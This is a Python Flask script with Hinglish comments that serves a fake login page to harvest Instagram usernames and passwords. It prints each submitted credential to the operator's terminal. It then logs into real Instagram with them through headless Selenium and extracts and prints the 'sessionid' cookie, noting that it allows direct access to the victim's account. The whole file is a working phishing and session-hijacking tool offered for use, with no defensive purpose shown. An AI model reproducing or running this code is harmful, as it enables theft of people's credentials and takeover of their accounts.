import os
import requests
from flask import Flask, request, render_template, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
import time

app = Flask(__name__)

# --- Instagram Login Checker Function ---
def check_instagram_login(username, password):
    """
    Yeh function Selenium use karke real Instagram pe login karta hai
    aur check karta hai ki credentials sahi hain ya nahi.
    """
    chrome_options = Options()
    chrome_options.add_argument("--headless") # Browser ko hide rakhega
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--log-level=3") # Logs ko kam karega

    # Driver ko initialize karna
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
    except Exception as e:
        print(f"Error initializing WebDriver: {e}")
        return {"status": 0, "session_id": None, "error": "WebDriver setup failed."}

    login_url = "https://www.instagram.com/accounts/login/"
    driver.get(login_url)

    try:
        # Username aur password field dhundhna
        time.sleep(3) # Page load hone ka wait
        username_field = driver.find_element(By.NAME, 'username')
        password_field = driver.find_element(By.NAME, 'password')

        username_field.send_keys(username)
        password_field.send_keys(password)
        password_field.submit()

        # Login hone ka wait karna
        time.sleep(5) # Yeh time adjust kar sakte ho for network speed

        # Check karna ki login successful hai ya nahi
        # Agar page me 'Not Now' ya 'Save Info' button aaya, to login successful hai
        # Agar 'Sorry, your password was incorrect' aaya, to failed.
        if "login" not in driver.current_url.lower():
            # Login successful
            cookies = driver.get_cookies()
            session_id = None
            for cookie in cookies:
                if cookie['name'] == 'sessionid':
                    session_id = cookie['value']
                    break
            
            driver.quit()
            return {"status": 1, "session_id": session_id, "error": None}
        else:
            # Login failed
            error_msg_element = driver.find_element(By.ID, 'slfErrorAlert')
            error_message = error_msg_element.text if error_msg_element else "Invalid credentials."
            driver.quit()
            return {"status": 0, "session_id": None, "error": error_message}

    except Exception as e:
        driver.quit()
        # Agar koi unexpected error aaye
        return {"status": 0, "session_id": None, "error": f"An error occurred: {e}"}


# Flask Routes (Previous Part)

@app.route('/')
def index():
    """
    Yeh route tumhe local host par login page dikhayega.
    """
    return render_template('login.html')

@app.route('/check', methods=['POST'])
def check_credentials():
    """
    Yeh route form se data lega, terminal par print karega,
    aur phir check_instagram_login function ko call karega.
    """
    username = request.form.get('username')
    password = request.form.get('password')

    # --- Step 1: Data ko terminal par print karna ---
    print("\n" + "="*30)
    print("Naye Credentials Received:")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print("="*30 + "\n")

    # --- Step 2: Real Instagram pe login check karna ---
    print("Instagram par check kar raha hun... Please wait.")
    result = check_instagram_login(username, password)

    # --- Step 3: Result ko terminal par print karna ---
    print("\n" + "="*30)
    print("Instagram Login Result:")
    if result['status'] == 1:
        print("Status: 1 (SUCCESS - Ye data sahi hai)")
        if result['session_id']:
            print(f"Session ID: {result['session_id']}")
            print("Is session ID ka use karke tum direct Instagram pe ja sakte ho.")
    else:
        print("Status: 0 (FAILED - Ye data galat hai)")
        if result['error']:
            print(f"Reason: {result['error']}")
    print("="*30 + "\n")

    # --- Step 4: User ko response bhejna (optional) ---
    # Yeh user ko ek simple response page dega, jaan boojh kar confuse na ho.
    if result['status'] == 1:
        response_message = "Login successful! Check your terminal for details."
    else:
        response_message = "Login failed. The username or password you entered is incorrect."

    return jsonify({
        "message": response_message,
        "status": result['status']
    })

if __name__ == '__main__':
    # Yeh line current working directory set karegi jahan pe app.py file hai
    import os
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    print("Tool starting...")
    print("Open http://127.0.0.1:5000 in your browser to create the login page.")
    print("Current working directory set to:", os.getcwd())
    app.run(host='0.0.0.0', port=5000, debug=True)
